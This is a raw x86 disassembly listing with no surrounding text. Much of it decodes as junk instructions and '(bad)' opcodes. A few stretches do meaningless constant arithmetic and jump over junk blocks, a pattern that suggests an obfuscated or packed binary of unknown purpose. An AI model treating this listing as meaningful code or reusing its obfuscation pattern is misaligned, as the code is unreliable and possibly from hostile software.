  40f139:	inc    ebx
  40f13a:	sub    BYTE PTR [edx],ch
  40f13c:	add    DWORD PTR [edi],esp
  40f13e:	jmp    0x6b555e06
  40f143:	or     bh,cl
  40f145:	fs out 0x1e,al
  40f148:	sbb    eax,0x22f34ef2
  40f14d:	out    0xe,al
  40f14f:	xor    esp,DWORD PTR [eax+ecx*2]
  40f152:	sbb    DWORD PTR [ebx+0x3856b3c3],edx
  40f158:	daa    
  40f159:	cmp    esi,esp
  40f15b:	inc    eax
  40f15c:	mov    ds:0xb916d692,al
  40f161:	inc    eax
  40f162:	inc    edi
  40f163:	or     bh,BYTE PTR [edi+edx*1]
  40f166:	aas    
  40f167:	enter  0x802b,0x7b
  40f16b:	xor    bl,BYTE PTR [ecx-0x45]
  40f16e:	push   esi
  40f16f:	faddp  st(5),st
  40f171:	jecxz  0x40f121
  40f173:	mov    ebx,0xa9a22e22
  40f178:	addr16 mov ds:0xf4ce,al
  40f17c:	xor    BYTE PTR [ebp+eiz*8-0x1284ef21],ah
  40f183:	sub    al,BYTE PTR [edx+0x470fe902]
  40f189:	je     0x40f145
  40f18b:	pop    eax
  40f18c:	loop   0x40f13a
  40f18e:	inc    ebx
  40f18f:	cwde   
  40f190:	sbb    eax,0x9d0900b3
  40f195:	addr16 sub al,0x71
  40f198:	xchg   esi,ecx
  40f19a:	push   ds
  40f19b:	lods   eax,DWORD PTR ds:[esi]
  40f19c:	fistp  DWORD PTR [edi-0x6b]
  40f19f:	(bad)  
  40f1a0:	xchg   edx,eax
  40f1a1:	aad    0xfb
  40f1a3:	mov    al,BYTE PTR [ecx]
  40f1a5:	repnz fcomp QWORD PTR [ecx+0x7]
  40f1a9:	cmp    dl,BYTE PTR ds:0xa655c015
  40f1af:	fxch   st(2)
  40f1b1:	test   eax,0xb52d07f
  40f1b6:	pop    edx
  40f1b7:	mov    ecx,0xea673273
  40f1bc:	js     0x40f174
  40f1be:	add    al,0xf5
  40f1c0:	das    
  40f1c1:	nop
  40f1c2:	(bad)  
  40f1c3:	push   ebx
  40f1c4:	mov    al,ds:0x45230d17
  40f1c9:	dec    ebx
  40f1ca:	cld    
  40f1cb:	inc    ecx
  40f1cc:	(bad)  
  40f1cd:	cmp    al,0x94
  40f1cf:	pushf  
  40f1d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1d1:	jg     0x40f1dd
  40f1d3:	imul   edi,DWORD PTR [ecx+0x44],0x873edef7
  40f1da:	rol    DWORD PTR [ecx+eiz*4-0x2862e7d2],1
  40f1e1:	cmp    DWORD PTR [ecx+0x40cfe2b5],edi
  40f1e7:	push   edx
  40f1e8:	je     0x40f1cc
  40f1ea:	pop    es
  40f1eb:	jle    0x40f25f
  40f1ed:	test   BYTE PTR [eax-0x39a2626b],bl
  40f1f3:	jne    0x40f24f
  40f1f5:	je     0x40f1c8
  40f1f7:	cmc    
  40f1f8:	xor    eax,0xac947f23
  40f1fd:	sub    DWORD PTR [esi],esp
  40f1ff:	or     BYTE PTR [esi],al
  40f201:	pop    eax
  40f202:	mov    ah,0x29
  40f204:	fsub   QWORD PTR [ebx-0x58c984d5]
  40f20a:	ins    BYTE PTR es:[edi],dx
  40f20b:	das    
  40f20c:	outs   dx,BYTE PTR ds:[esi]
  40f20d:	std    
  40f20e:	push   0xffffffe5
  40f210:	mov    BYTE PTR [esi],ch
  40f212:	add    DWORD PTR [ebx],edi
  40f214:	and    al,0x99
  40f216:	cld    
  40f217:	or     ecx,DWORD PTR [ebp+0x28b978fa]
  40f21d:	std    
  40f21e:	imul   DWORD PTR [ecx]
  40f220:	mov    eax,ds:0x724621e5
  40f225:	loopne 0x40f21b
  40f227:	rcl    DWORD PTR [eax],1
  40f229:	push   esp
  40f22a:	push   eax
  40f22b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f22c:	jne    0x40f21d
  40f22e:	jmp    0x875f:0x8c7619de
  40f235:	jns    0x40f1d0
  40f237:	mov    cl,0x5a
  40f239:	pop    eax
  40f23a:	scas   eax,DWORD PTR es:[edi]
  40f23b:	jne    0x40f23f
  40f23d:	mov    bh,0x1
  40f23f:	xchg   esp,eax
  40f240:	push   eax
  40f241:	xor    eax,0x7f8476c2
  40f246:	pop    ss
  40f247:	js     0x40f2b7
  40f249:	mov    ebp,esp
  40f24b:	sub    eax,0x266999a3
  40f250:	test   DWORD PTR [edx-0x1224e517],eax
  40f256:	or     esp,edi
  40f258:	test   bl,bh
  40f25a:	mov    WORD PTR [edx-0x6a],ss
  40f25d:	mov    bh,0x24
  40f25f:	fs inc eax
  40f261:	and    eax,DWORD PTR [ebp+0x4b]
  40f264:	xchg   DWORD PTR [edi],ebx
  40f266:	rcl    cl,cl
  40f268:	or     dl,BYTE PTR fs:[edx-0x12731566]
  40f26f:	popa   
  40f270:	cmp    al,BYTE PTR [esi+0x5]
  40f273:	mov    eax,DWORD PTR [eax]
  40f275:	dec    eax
  40f276:	je     0x40f250
  40f278:	rcr    DWORD PTR [eax+0x2120bd41],0x32
  40f27f:	and    al,BYTE PTR [edi]
  40f281:	cmp    edx,eax
  40f283:	jmp    0x28f7:0xada9baa9
  40f28a:	jmp    0x40f27a
  40f28c:	retf   0xd9ac
  40f28f:	out    0xa3,eax
  40f291:	shl    BYTE PTR [ecx-0x18c1a689],1
  40f297:	rcr    BYTE PTR [ebp+0x20dc7a6e],cl
  40f29d:	cmp    edi,DWORD PTR [eax+0x69799478]
  40f2a3:	mov    esp,0x3824533c
  40f2a8:	or     al,0x14
  40f2aa:	push   ecx
  40f2ab:	push   ebx
  40f2ac:	push   edi
  40f2ad:	add    dl,BYTE PTR [ebx-0x65]
  40f2b0:	cld    
  40f2b1:	nop
  40f2b2:	xor    ah,0xe7
  40f2b5:	or     dl,ch
  40f2b7:	jmp    0x40f27e
  40f2b9:	dec    esi
  40f2ba:	(bad)  
  40f2bb:	adc    eax,0x4c17cbc9
  40f2c0:	push   edi
  40f2c1:	or     al,0xda
  40f2c3:	mov    ah,0xb
  40f2c5:	fdivr  st,st(6)
  40f2c7:	adc    al,BYTE PTR fs:[ebx]
  40f2ca:	aad    0xa5
  40f2cc:	fdivr  DWORD PTR [ebp+ecx*8+0x5b]
  40f2d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2d1:	jns    0x40f289
  40f2d3:	shl    BYTE PTR [edx],0x2f
  40f2d6:	call   0x963:0xa3cd1a39
  40f2dd:	jae    0x40f264
  40f2df:	ins    DWORD PTR es:[edi],dx
  40f2e0:	adc    DWORD PTR [ebx-0x60],0xadcb31fa
  40f2e7:	jns    0x40f2f6
  40f2e9:	out    dx,al
  40f2ea:	(bad)  
  40f2eb:	inc    eax
  40f2ec:	mov    cl,0x3e
  40f2ee:	mov    dl,0xa2
  40f2f0:	rcl    BYTE PTR ds:0xe97baab1,0x6c
  40f2f7:	popa   
  40f2f8:	hlt    
  40f2f9:	mov    edx,0x628e2de8
  40f2fe:	push   ebx
  40f2ff:	inc    ebp
  40f300:	mov    ah,0xb9
  40f302:	pop    edi
  40f303:	out    dx,al
  40f304:	pusha  
  40f305:	xor    BYTE PTR [edx],bl
  40f307:	add    BYTE PTR [ecx-0x3c],0x5e
  40f30b:	pop    edi
  40f30c:	sub    al,0xaa
  40f30e:	repz test eax,0x3cb0369a
  40f314:	test   DWORD PTR [edi-0x2],esp
  40f317:	pop    esp
  40f318:	mul    DWORD PTR [ecx]
  40f31a:	test   BYTE PTR ds:0x20f98ccb,bl
  40f320:	scas   al,BYTE PTR es:[edi]
  40f321:	jecxz  0x40f388
  40f323:	and    eax,0x9b966035
  40f328:	dec    esi
  40f329:	inc    ebx
  40f32a:	(bad)  
  40f32b:	pop    ds
  40f32c:	mov    WORD PTR [esi+0x73],fs
  40f32f:	cld    
  40f330:	lods   al,BYTE PTR ds:[esi]
  40f331:	xchg   esp,eax
  40f332:	out    dx,eax
  40f333:	pop    ebx
  40f334:	call   0xaa185e07
  40f339:	stc    
  40f33a:	retf   0xd362
  40f33d:	cmc    
  40f33e:	imul   ebp,eax,0x5d
  40f341:	in     al,dx
  40f342:	add    ah,bl
  40f344:	in     al,dx
  40f345:	stos   BYTE PTR es:[edi],al
  40f346:	inc    ebp
  40f347:	push   cs
  40f348:	adc    ebx,DWORD PTR [eax+0x1351d8a0]
  40f34e:	inc    edx
  40f34f:	gs pop esi
  40f351:	pop    ebx
  40f352:	leave  
  40f353:	ret    0xc
  40f356:	push   ebp
  40f357:	mov    ebp,esp
  40f359:	sub    esp,0xec
  40f35f:	push   ebx
  40f360:	push   esi
  40f361:	mov    DWORD PTR [ebp-0x8],0x548e
  40f368:	mov    DWORD PTR [ebp-0x4],0x61c2
  40f36f:	mov    eax,DWORD PTR [ebp-0x4]
  40f372:	jmp    0x40f640
  40f377:	outs   dx,BYTE PTR ds:[esi]
  40f378:	rol    BYTE PTR [eax],cl
  40f37a:	jnp    0x40f399
  40f37c:	cmp    ch,BYTE PTR [edx-0x5e]
  40f37f:	ret    0x499f
  40f382:	push   0x9
  40f384:	aam    0x85
  40f386:	jl     0x40f3b3
  40f388:	test   al,0x18
  40f38a:	sbb    BYTE PTR [esi-0xe7e7ec],bh
  40f390:	lock rcr esi,0x52
  40f394:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f395:	loop   0x40f3dd
  40f397:	sub    eax,0x3f1b83f0
  40f39c:	mov    ch,0xef
  40f39e:	outs   dx,BYTE PTR ds:[esi]
  40f39f:	into   
  40f3a0:	pop    esi
  40f3a1:	xchg   ebx,eax
  40f3a2:	push   edi
  40f3a3:	out    dx,eax
  40f3a4:	xor    BYTE PTR [eax-0x37],0xd3
  40f3a8:	sub    esi,DWORD PTR [edi]
  40f3aa:	sub    esi,edx
  40f3ac:	das    
  40f3ad:	and    ch,bh
  40f3af:	(bad)  
  40f3b0:	xchg   ebp,eax
  40f3b1:	shl    DWORD PTR [ebx],1
  40f3b3:	push   0xda8fe93
  40f3b8:	jle    0x40f341
  40f3ba:	mov    dl,0x29
  40f3bc:	xchg   ecx,eax
  40f3bd:	out    dx,al
  40f3be:	outs   dx,DWORD PTR ds:[esi]
  40f3bf:	dec    esp
  40f3c0:	loop   0x40f35a
  40f3c2:	or     bl,BYTE PTR [edi-0x4e]
  40f3c5:	arpl   WORD PTR [eax+edi*4],bx
  40f3c8:	les    esp,FWORD PTR [edi-0x5eb78fce]
  40f3ce:	xchg   ecx,eax
  40f3cf:	or     BYTE PTR [ecx-0x58c18deb],cl
  40f3d5:	inc    eax
  40f3d6:	jge    0x40f41d
  40f3d8:	xor    al,al
  40f3da:	xchg   edi,eax
  40f3db:	int    0xd9
  40f3dd:	aad    0xa
  40f3df:	in     al,dx
  40f3e0:	lea    esp,[edx+0x10]
  40f3e3:	adc    ebp,ecx
  40f3e5:	into   
  40f3e6:	fadd   DWORD PTR [eax]
  40f3e8:	inc    esp
  40f3e9:	xchg   ebx,esi
  40f3eb:	aaa    
  40f3ec:	arpl   ax,cx
  40f3ee:	or     BYTE PTR [eax],al
  40f3f0:	add    ch,cl
  40f3f2:	lds    esp,FWORD PTR [ecx+edx*8]
  40f3f5:	sub    ebx,ebx
  40f3f7:	shr    DWORD PTR [esi-0x58],0x52
  40f3fb:	xor    BYTE PTR [ebp+edi*2+0x4a],0x20
  40f400:	in     al,0xc0
  40f402:	ins    BYTE PTR es:[edi],dx
  40f403:	pop    edi
  40f404:	dec    esp
  40f405:	and    ax,WORD PTR [ebp-0x129f77d4]
  40f40c:	push   ecx
  40f40d:	sbb    edx,eax
  40f40f:	int    0x19
  40f411:	nop
  40f412:	sub    BYTE PTR [ebx+0x5e],0x1d
  40f416:	ins    BYTE PTR es:[edi],dx
  40f417:	ds not cl
  40f41a:	dec    eax
  40f41b:	out    0x6b,eax
  40f41d:	not    DWORD PTR [edx+0x3c4418be]
  40f423:	je     0x40f497
  40f425:	call   0xd1b3ac81
  40f42a:	loope  0x40f3bd
  40f42c:	mov    ebp,DWORD PTR [edx-0x23]
  40f42f:	sub    esp,esi
  40f431:	jl     0x40f434
  40f433:	es mov ebp,0xf95cb7f4
  40f439:	mov    ah,ah
  40f43b:	(bad)  
  40f43c:	scas   al,BYTE PTR es:[edi]
  40f43d:	xchg   esp,eax
  40f43e:	call   0xf23e0992
  40f443:	rcr    ah,0xb
  40f446:	pop    ebp
  40f447:	xor    esp,DWORD PTR [esi]
  40f449:	dec    ebp
  40f44a:	call   0xb25c5f17
  40f44f:	jle    0x40f481
  40f451:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f452:	lock cmp BYTE PTR [esi+0x279b4e23],bh
  40f459:	(bad)  
  40f45a:	ja     0x40f476
  40f45c:	lahf   
  40f45d:	les    ecx,FWORD PTR [edx-0x6631f6b1]
  40f463:	push   ebx
  40f464:	jp     0x40f41a
  40f466:	(bad)  
  40f468:	loopne 0x40f4d6
  40f46a:	mov    eax,0x7756cb62
  40f46f:	out    dx,eax
  40f470:	push   ds
  40f471:	popa   
  40f472:	in     al,0x89
  40f474:	rcl    DWORD PTR [edi+0x4fec7a21],1
  40f47a:	add    al,0x47
  40f47c:	not    DWORD PTR [esi-0x54]
  40f47f:	mov    dh,0xdf
  40f481:	mov    al,ds:0x6eb87d52
  40f486:	lock inc ebx
  40f488:	xor    edi,DWORD PTR [ecx-0x40]
  40f48b:	cwde   
  40f48c:	aas    
  40f48d:	arpl   WORD PTR [ebp+0x4b],cx
  40f490:	and    edi,DWORD PTR [edx+0x34]
  40f493:	mov    al,ds:0xd63ef96b
  40f498:	mov    WORD PTR [esp+ebp*8],cs
  40f49b:	cmp    dl,BYTE PTR [ebp+0x4e]
  40f49e:	add    BYTE PTR [eax],al
  40f4a0:	mov    WORD PTR [edi-0x4b22c67f],gs
  40f4a6:	das    
  40f4a7:	aaa    
  40f4a8:	psubsw mm7,QWORD PTR [eax-0x35]
  40f4ac:	jne    0x40f491
  40f4ae:	xchg   DWORD PTR [esp+esi*4-0x7],ebp
  40f4b2:	mov    ss,WORD PTR [ecx]
  40f4b4:	pop    ebp
  40f4b5:	cld    
  40f4b6:	jmp    0xf135:0x6c4a183d
  40f4bd:	xchg   edx,eax
  40f4be:	pop    ds
  40f4bf:	stos   BYTE PTR es:[edi],al
  40f4c0:	enter  0x9672,0x11
  40f4c4:	add    ah,BYTE PTR [ecx]
  40f4c6:	test   DWORD PTR [eax+0x26],eax
  40f4c9:	sbb    ebx,DWORD PTR [ecx+ecx*2]
  40f4cc:	sub    al,BYTE PTR [eax]
  40f4ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4cf:	aaa    
  40f4d0:	adc    ah,BYTE PTR [edx+edi*2+0x6a]
  40f4d4:	push   cs
  40f4d5:	sahf   
  40f4d6:	das    
  40f4d7:	push   0xccf8ad8b
  40f4dc:	retf   0x63bf
  40f4df:	inc    ecx
  40f4e0:	add    BYTE PTR ds:0x5c129c28,al
  40f4e6:	ror    DWORD PTR [eax+ebp*8+0x54],cl
  40f4ea:	inc    eax
  40f4eb:	cmp    ah,BYTE PTR [ebx]
  40f4ed:	pusha  
  40f4ee:	mov    al,ds:0x8e5bc25b
  40f4f3:	(bad)  
  40f4f4:	xchg   edi,eax
  40f4f5:	jmp    0x40f49a
  40f4f7:	es out dx,al
  40f4f9:	add    ebx,edx
  40f4fb:	hlt    
  40f4fc:	ror    BYTE PTR [edx-0x7d],0x6e
  40f500:	sbb    eax,DWORD PTR ds:0x7735e9ca
  40f506:	mov    esi,0xfeff1f78
  40f50b:	xchg   esp,eax
  40f50c:	or     esi,ebx
  40f50e:	pop    esp
  40f50f:	jns    0x40f4de
  40f511:	in     eax,dx
  40f512:	in     al,0x1f
  40f514:	stos   DWORD PTR es:[edi],eax
  40f515:	dec    ecx
  40f516:	xlat   BYTE PTR ds:[ebx]
  40f517:	inc    edx
  40f518:	lods   eax,DWORD PTR ds:[esi]
  40f519:	jno    0x40f552
  40f51b:	xor    dl,BYTE PTR [edi-0x12]
  40f51e:	sub    esp,esp
  40f520:	cmp    al,0x79
  40f522:	ds sbb eax,0x93ee1423
  40f528:	pop    eax
  40f529:	or     dl,BYTE PTR [esi]
  40f52b:	dec    ebx
  40f52c:	scas   al,BYTE PTR es:[edi]
  40f52d:	lea    ebx,[eax+0x13]
  40f530:	xchg   esi,eax
  40f531:	xor    al,al
  40f533:	mov    bl,dl
  40f535:	mov    ch,0x9e
  40f537:	sbb    DWORD PTR [edi+0x56],esi
  40f53a:	push   ecx
  40f53b:	adc    dl,BYTE PTR [ebp-0x4202a42e]
  40f541:	scas   eax,DWORD PTR es:[edi]
  40f542:	jo     0x40f50e
  40f544:	or     esi,DWORD PTR [edx]
  40f546:	cmp    ebp,DWORD PTR [ecx+edx*2]
  40f549:	mov    WORD PTR [esp+edx*4],?
  40f54c:	or     eax,0x54888b40
  40f551:	jge    0x40f584
  40f553:	ins    DWORD PTR es:[edi],dx
  40f554:	sub    cl,BYTE PTR [edi+0xf]
  40f557:	mov    dh,0x4b
  40f559:	jp     0x40f5a4
  40f55b:	sbb    DWORD PTR [esi+0x564ae31b],ecx
  40f561:	in     al,dx
  40f562:	mov    esi,0x5bb80d66
  40f567:	sub    BYTE PTR [edi-0xc2e197e],dl
  40f56d:	sti    
  40f56e:	add    edx,DWORD PTR [edi]
  40f570:	dec    ecx
  40f571:	push   edx
  40f572:	(bad)  
  40f573:	lods   eax,DWORD PTR ds:[esi]
  40f574:	das    
  40f575:	cmp    ch,dl
  40f577:	imul   esi,DWORD PTR [ebx-0x153c3f9a],0x85d76a09
  40f581:	shl    DWORD PTR [eax+0x10a662f7],1
  40f587:	idiv   DWORD PTR [eax+0x79f2929f]
  40f58d:	push   ebp
  40f58e:	pop    ecx
  40f58f:	xchg   esp,eax
  40f590:	pop    edx
  40f591:	das    
  40f592:	adc    DWORD PTR [ebx],ebx
  40f594:	out    0x9,al
  40f596:	fsub   DWORD PTR [esi+0x4b]
  40f599:	mov    esp,0x433a0018
  40f59e:	repnz sti 
  40f5a0:	and    al,0x28
  40f5a2:	push   0xe8f92aa7
  40f5a7:	and    eax,0xdad41b33
  40f5ac:	push   DWORD PTR [ecx+0x4fbd32ff]
  40f5b2:	pop    edx
  40f5b3:	cwde   
  40f5b4:	call   0x6a38:0xe1b6b263
  40f5bb:	sub    DWORD PTR [eax-0xb92cb76],ebp
  40f5c1:	fdiv   DWORD PTR [edi]
  40f5c3:	xchg   esp,eax
  40f5c4:	mov    edx,0xae488edf
  40f5c9:	jnp    0x40f5a1
  40f5cb:	sub    esp,edx
  40f5cd:	xor    BYTE PTR [esi],bl
  40f5cf:	xchg   DWORD PTR [eax-0x67],edi
  40f5d2:	test   al,dh
  40f5d4:	nop
  40f5d5:	dec    ebp
  40f5d6:	in     al,0x62
  40f5d8:	(bad)  
  40f5da:	mov    WORD PTR [esi],?
  40f5dc:	fs ins DWORD PTR es:[edi],dx
  40f5de:	or     BYTE PTR [edx],bl
  40f5e0:	sub    eax,0x72cda5a7
  40f5e5:	lock jno 0x40f633
  40f5e8:	bound  esi,QWORD PTR [ebx+0x2015089f]
  40f5ee:	mov    esi,?
  40f5f0:	stc    
  40f5f1:	sbb    BYTE PTR [eax],0xf
  40f5f4:	and    DWORD PTR [ebp+0x9],0x1982f762
  40f5fb:	jmp    0x42bf:0xf33195b6
  40f602:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f603:	ins    DWORD PTR es:[edi],dx
  40f604:	pushf  
  40f605:	push   ss
  40f606:	mov    dh,0x24
  40f608:	pop    edx
  40f609:	inc    ecx
  40f60a:	lahf   
  40f60b:	and    dh,BYTE PTR [ecx+0x2ab843cc]
  40f611:	cmp    ch,BYTE PTR [ecx+0x54]
  40f614:	and    BYTE PTR [edi+0x7f],ah
  40f617:	jg     0x40f64f
  40f619:	dec    edi
  40f61a:	outs   dx,BYTE PTR ds:[esi]
  40f61b:	push   edx
  40f61c:	add    eax,0xaef27628
  40f621:	jo     0x40f694
  40f623:	ss ret 
  40f625:	mov    cl,ch
  40f627:	mov    ebx,0x6dc7f83b
  40f62c:	mov    ch,0x43
  40f62e:	shl    DWORD PTR [ebx-0x3dae94b2],0xf3
  40f635:	cld    
  40f636:	ffree  st(4)
  40f638:	mov    esp,0x2027c0b3
  40f63d:	push   esp
  40f63e:	xchg   ebx,eax
  40f63f:	xchg   edx,eax
  40f640:	mov    ecx,DWORD PTR [ebp-0x8]
  40f643:	add    eax,0x1ca5
  40f648:	or     eax,ecx
  40f64a:	mov    ecx,DWORD PTR ds:0x422598
  40f650:	lea    eax,[eax+ecx*1-0x7eef]
  40f657:	mov    DWORD PTR [ebp-0x5c],eax
  40f65a:	mov    DWORD PTR [ebp-0x4],0x8ea
  40f661:	mov    DWORD PTR [ebp-0x8],0x5759
  40f668:	mov    eax,DWORD PTR [ebp-0x8]
  40f66b:	mov    ecx,DWORD PTR [ebp-0x4]
  40f66e:	and    eax,0x27f6
  40f673:	xor    eax,ecx
  40f675:	mov    ecx,DWORD PTR ds:0x4226cc
  40f67b:	imul   eax,eax,0x18
  40f67e:	xor    eax,0x17970
  40f683:	lea    eax,[ebp+eax*1-0x54]
  40f687:	mov    DWORD PTR [eax],ecx
  40f689:	mov    DWORD PTR [ebp-0x4],0x7584
  40f690:	mov    DWORD PTR [ebp-0x8],0x7c9f
  40f697:	mov    eax,DWORD PTR [ebp-0x8]
  40f69a:	xor    edx,edx
  40f69c:	push   0x3
  40f69e:	pop    ecx
  40f69f:	div    ecx
  40f6a1:	mov    ecx,DWORD PTR [ebp-0x4]
  40f6a4:	xor    edx,edx
  40f6a6:	push   0x2
  40f6a8:	add    eax,0x14d3
  40f6ad:	and    eax,ecx
  40f6af:	mov    ecx,0x6404
  40f6b4:	sub    ecx,eax
  40f6b6:	mov    DWORD PTR [ebp-0x74],ecx
  40f6b9:	mov    DWORD PTR [ebp-0xc],0x13b5
  40f6c0:	mov    DWORD PTR [ebp-0x8],0x2e54
  40f6c7:	mov    DWORD PTR [ebp-0x4],0x2f11
  40f6ce:	mov    eax,DWORD PTR [ebp-0x8]
  40f6d1:	mov    ecx,DWORD PTR [ebp-0x4]
  40f6d4:	lea    eax,[ecx+eax*1-0x65ec]
  40f6db:	mov    ecx,0x5e208
  40f6e0:	div    ecx
  40f6e2:	mov    ecx,DWORD PTR [ebp-0xc]
  40f6e5:	lea    eax,[eax+ecx*1+0x40c7]
  40f6ec:	mov    DWORD PTR [ebp-0x24],eax
  40f6ef:	mov    DWORD PTR [ebp-0x4],0x1bc6
  40f6f6:	mov    DWORD PTR [ebp-0x8],0x16ac
  40f6fd:	mov    DWORD PTR [ebp-0xc],0x2185
  40f704:	mov    eax,DWORD PTR [ebp-0xc]
  40f707:	mov    ecx,DWORD PTR [ebp-0x8]
  40f70a:	xor    eax,0x1f75
  40f70f:	sub    eax,ecx
  40f711:	mov    ecx,DWORD PTR [ebp-0x4]
  40f714:	jmp    0x40f9e2
  40f719:	mov    ch,0xd2
  40f71b:	pop    edx
  40f71c:	mov    BYTE PTR [edx+0x20],bl
  40f71f:	stos   DWORD PTR es:[edi],eax
  40f720:	and    dl,BYTE PTR [edx+0x34]
  40f723:	sbb    BYTE PTR [edx-0x43964c90],ch
  40f729:	shl    DWORD PTR [edx+0x14be1818],1
  40f72f:	sbb    BYTE PTR [eax],bl
  40f731:	and    BYTE PTR [edi+0x4d],dh
  40f734:	fist   WORD PTR [edx-0x2c]
  40f737:	jb     0x40f7ab
  40f739:	xchg   esi,eax
  40f73a:	jg     0x40f78b
  40f73c:	fsubr  st,st(7)
  40f73e:	aas    
  40f73f:	imul   edx,DWORD PTR [esi-0x17],0xf
  40f743:	stos   BYTE PTR es:[edi],al
  40f744:	addr16 adc edi,edx
  40f747:	lock shl ecx,0xfe
  40f74b:	push   cs
  40f74c:	ja     0x40f748
  40f74e:	xchg   ebx,eax
  40f74f:	cli    
  40f750:	and    ebx,eax
  40f752:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f753:	mov    ecx,0xfcf2a462
  40f758:	dec    esi
  40f759:	cmc    
  40f75a:	inc    eax
  40f75b:	into   
  40f75c:	mov    al,ds:0xa505bbec
  40f761:	nop
  40f762:	pusha  
  40f763:	retf   0xa0b1
  40f766:	pop    ds
  40f767:	out    dx,eax
  40f768:	in     al,dx
  40f769:	mov    al,0x9a
  40f76b:	(bad)  
  40f76c:	call   0x49dd6b0e
  40f771:	mov    dl,0x3e
  40f773:	xchg   esi,eax
  40f774:	retf   0x2200
  40f777:	ds and ebx,edx
  40f77a:	jmp    0xf344:0x65069ff3
  40f781:	ss pop es
  40f783:	sahf   
  40f784:	ins    DWORD PTR es:[edi],dx
  40f785:	sub    eax,0x22c1c524
  40f78a:	pop    eax
  40f78b:	xchg   ecx,eax
  40f78c:	mov    dh,0xc5
  40f78e:	and    DWORD PTR [ecx],edi
  40f790:	push   0x3c639e94
  40f795:	push   esi
  40f796:	mov    al,ds:0xd8954b16
  40f79b:	or     DWORD PTR [esi],edi
  40f79d:	jbe    0x40f79e
  40f79f:	les    esp,FWORD PTR [ebp+0x5c]
  40f7a2:	mov    WORD PTR [ebx+0x5287bfb7],fs
  40f7a8:	dec    ebx
  40f7a9:	dec    esi
  40f7aa:	xor    eax,0x8740c3e5
  40f7af:	outs   dx,BYTE PTR ds:[esi]
  40f7b0:	mov    al,ds:0xb6e792c5
  40f7b5:	xor    al,0x43
  40f7b7:	shr    DWORD PTR [ebx-0x26],1
  40f7ba:	pushf  
  40f7bb:	fild   QWORD PTR [edx]
  40f7bd:	mov    bh,0x24
  40f7bf:	cmp    al,0x47
  40f7c1:	cdq    
  40f7c2:	inc    edx
  40f7c3:	cs ins DWORD PTR es:[edi],dx
  40f7c5:	ret    0xec25
  40f7c8:	mov    ah,dh
  40f7ca:	sub    al,0x7c
  40f7cc:	xlat   BYTE PTR ds:[ebx]
  40f7cd:	fs cld 
  40f7cf:	iret   
  40f7d0:	stos   BYTE PTR es:[edi],al
  40f7d1:	or     ah,ah
  40f7d3:	je     0x40f7ba
  40f7d5:	loop   0x40f809
  40f7d7:	es mov dl,0xb8
  40f7da:	imul   esp,DWORD PTR [ebx+0x672cce7d],0x20aa312a
  40f7e4:	rol    BYTE PTR [esi-0x5f31df95],cl
  40f7ea:	jae    0x40f790
  40f7ec:	popa   
  40f7ed:	mov    cl,0x31
  40f7ef:	out    0x16,eax
  40f7f1:	cdq    
  40f7f2:	dec    edx
  40f7f3:	lea    eax,[edi+0x2]
  40f7f6:	jns    0x40f81c
  40f7f8:	jmp    FWORD PTR [ecx]
  40f7fa:	or     al,0xa
  40f7fd:	fdivp  st(0),st
  40f7ff:	xchg   esi,eax
  40f800:	mov    bh,0x5
  40f802:	push   ds
  40f803:	xchg   edi,eax
  40f804:	in     eax,0x47
  40f806:	push   edx
  40f807:	mov    esp,0x6e8e754f
  40f80c:	bnd es ret 0x93d3
  40f811:	mov    bl,0x6c
  40f813:	scas   al,BYTE PTR es:[edi]
  40f814:	into   
  40f815:	sub    eax,0xdfc4cf16
  40f81a:	sub    DWORD PTR [esi-0x52],edi
  40f81d:	mov    edx,0x2c4fe228
  40f822:	pop    ds
  40f823:	jns    0x40f7db
  40f825:	nop
  40f826:	adc    DWORD PTR [edi+0x69],eax
  40f829:	mov    ebx,edx
  40f82b:	(bad)  
  40f82c:	pop    ebx
  40f82d:	test   ah,ch
  40f82f:	mov    bh,0x22
  40f831:	or     bh,BYTE PTR [ebp-0x7099a106]
  40f837:	mov    bh,0x69
  40f839:	xor    BYTE PTR [edi],al
  40f83b:	jmp    0x40f7ef
  40f83d:	xchg   DWORD PTR ds:0x332ccba6,eax
  40f843:	outs   dx,DWORD PTR ds:[esi]
  40f844:	shr    BYTE PTR [eax+ebp*1+0x17],cl
  40f848:	out    dx,eax
  40f849:	sahf   
  40f84a:	iret   
  40f84b:	inc    ebx
  40f84c:	fwait
  40f84d:	in     eax,0xb6
  40f84f:	sub    esp,DWORD PTR [eax]
  40f851:	xchg   ecx,eax
  40f852:	inc    eax
  40f853:	mov    dh,0x9d
  40f855:	shl    BYTE PTR [esi-0x57],cl
  40f858:	adc    DWORD PTR [edx-0x4353ce6e],ebx
  40f85e:	sbb    DWORD PTR [ecx-0x1353d59c],ecx
  40f864:	out    dx,al
  40f865:	mov    al,ds:0x19615efc
  40f86a:	repz iret 
  40f86c:	out    0xb8,al
  40f86e:	xchg   edx,eax
  40f86f:	push   ecx
  40f870:	lock daa 
  40f872:	jb     0x40f8d4
  40f874:	mov    ch,0x31
  40f876:	je     0x40f860
  40f878:	fs cmp eax,0xd76e5f70
  40f87e:	push   0xc9aa4dc7
  40f883:	and    al,0xa2
  40f885:	repnz dec esp
  40f887:	or     al,0xd8
  40f889:	xlat   BYTE PTR ds:[ebx]
  40f88a:	or     eax,0x362c01d4
  40f88f:	(bad)
  40f894:	mov    ecx,0xcab3f6f0
  40f899:	mov    es,WORD PTR [eax]
  40f89b:	mov    bh,0xb6
  40f89d:	mov    bh,0xe3
  40f89f:	and    edi,ecx
  40f8a1:	add    DWORD PTR [ecx-0x24d3c3d6],eax
  40f8a7:	mov    bh,0x25
  40f8a9:	xchg   esi,eax
  40f8aa:	aad    0xde
  40f8ac:	leave  
  40f8ad:	aas    
  40f8ae:	mov    esi,DWORD PTR [edx-0x533e969f]
  40f8b4:	ror    BYTE PTR [eax+eax*4-0x16],0xf
  40f8b9:	outs   dx,BYTE PTR ds:[esi]
  40f8ba:	fcomp  QWORD PTR [edx+0x57]
  40f8bd:	into   
  40f8be:	push   eax
  40f8bf:	outs   dx,DWORD PTR ds:[esi]
  40f8c0:	or     ebx,edi
  40f8c2:	das    
  40f8c3:	xchg   esi,eax
